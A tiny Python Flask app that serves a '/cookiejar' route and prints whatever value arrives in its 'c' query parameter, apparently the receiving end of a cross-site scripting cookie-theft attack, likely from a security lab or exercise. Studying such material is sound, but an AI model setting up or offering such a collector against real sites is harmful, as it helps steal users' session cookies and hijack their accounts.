import os
from flask import Flask, session, render_template, url_for, escape, request, redirect
app = Flask(__name__)

@app.route('/cookiejar')
def cookiejar():
	cookie = request.args.get('c')
	if cookie:
		print cookie

	return "thanks!"

if __name__ == "__main__":
	app.run(port=5001)

